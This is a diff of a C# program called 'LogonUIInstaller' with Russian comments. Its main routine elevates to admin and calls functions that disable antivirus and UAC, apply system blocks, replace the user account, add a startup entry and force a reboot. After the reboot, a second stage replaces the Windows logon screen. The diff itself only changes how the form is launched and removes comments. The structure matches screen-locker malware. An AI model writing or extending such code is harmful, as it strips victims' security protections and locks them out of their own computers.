@@ -26,40 +26,30 @@ namespace LogonUIInstaller
 
             try
             {
-                // ========== СТАДИЯ 2: ЗАПУСК ФОРМЫ (после перезагрузки) ==========
                 if (args.Length > 0 && args[0] == "stage2")
                 {
                     Application.EnableVisualStyles();
                     Application.SetCompatibleTextRenderingDefault(false);
 
-                    // Заменяем LogonUI
                     ReplaceLogonUI();
 
-                    // ЗАПУСКАЕМ ФОРМУ
-                    MainInterface ui = new MainInterface();
-                    ui.Show();
-                    Application.Run();
+                    // ЗАПУСК ФОРМЫ КАК В NoSleep
+                    Application.Run(new MainInterface());
                     return;
                 }
 
-                // ========== СТАДИЯ 1: УСТАНОВЩИК (первый запуск) ==========
                 if (!IsElevated())
                 {
                     RestartAsAdmin();
                     return;
                 }
 
-                // Распаковка ресурсов
                 ExtractAllResources();
-
-                // Блокировки и настройки
                 ApplySystemBlocks();
                 DisableAntivirusAndUAC();
                 ReplaceWallpaperAndCursors();
                 ReplaceUserAccount();
                 AddToStartupWithStage2();
-
-                // Принудительная перезагрузка
                 ForceReboot();
             }
             finally
